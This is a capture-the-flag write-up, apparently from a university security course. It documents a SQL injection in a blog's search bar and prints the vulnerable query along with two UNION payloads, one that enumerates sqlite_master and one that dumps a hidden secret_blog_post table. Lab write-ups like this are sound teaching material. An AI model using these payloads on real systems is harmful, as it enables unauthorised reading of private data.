# Challenge `Wow, it can't be more juicy than this!` writeup

- Vulnerability: What type of vulnerability is being exploited
  - Vulnerable to SQL injection

- Where: Where is the vulnerability present
  - `http://mustard.stt.rnl.tecnico.ulisboa.pt:23261`, on the search bar

- Impact: What results of exploiting this vulnerability
  - Allows the user to access unpublished articles

## Steps to reproduce

1. Navigate to `http://mustard.stt.rnl.tecnico.ulisboa.pt:23261`
2. The search bar executes the following query and is vulnerable to SQLi (discovered by inputting `'` with a random string following):

```sql
SELECT id, title, content FROM blog_post WHERE title LIKE '%<input>%' OR content LIKE '%input%' 
```

3. It is possible to view other tables on the database with the following input:

```sql
' UNION SELECT sql, name, tbl_name FROM sqlite_master; --
```

4. A table called `secret_blog_post` exists and we can view its content with:

```sql
' UNION SELECT * FROM secret_blog_post; --
```
